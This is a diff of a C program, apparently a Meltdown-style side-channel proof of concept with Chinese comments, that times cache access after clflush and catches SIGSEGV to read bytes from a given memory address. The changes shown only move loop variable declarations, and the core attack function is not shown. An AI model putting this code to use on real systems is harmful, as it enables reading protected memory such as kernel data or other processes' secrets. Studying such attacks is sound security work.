@@ -24,7 +24,8 @@ int get_time(volatile char *addr){ //获得读取内存的时间
 }
 int loadpage(){  //判断攻击位置
     unsigned int volatile pagenum,ans,min=0xffffffff,time;
-    for (int i=0;i<256;i++){
+    int i;
+    for (i=0;i<256;i++){
         pagenum=((i * 167) + 13) & 255;
         time=get_time(target+size*pagenum);
         if (min>time){
@@ -60,9 +61,10 @@ int attack(char* addr) //核心代码
 }
 void readbyte(int fd,char *addr){//读取内容
     static char buf[256];
+    int i;
     memset(target,0xff, sizeof(target));
     pread(fd, buf, sizeof(buf), 0);   
-    for (int i=0;i<256;i++){
+    for (i=0;i<256;i++){
         _mm_clflush(target+i*size);
     }
     if (attack(addr)!=0) {
@@ -81,8 +83,8 @@ int main(int argc, const char* * argv){
     signal(SIGSEGV,SegErrCatch);   
 	sscanf(argv[1],"%lx",&addr);
     sscanf(argv[2],"%d",&len);
-    
-    for (int j=0;j<len;j++){
+    int j;
+    for (j=0;j<len;j++){
         memset(score,0,sizeof(score));
 		max1=max2=0;
 		while (score[max1]<=2*score[max2]+20){
@@ -100,7 +102,8 @@ int main(int argc, const char* * argv){
 			}			
         }
 		tmp=0;
-		for (int i=0;i<256;i++){
+		int i;
+		for (i=0;i<256;i++){
 			if (score[i]>score[tmp]) tmp=i;
 		}
         printf("地址为：%lx，内容为：%c\n",addr,tmp);  
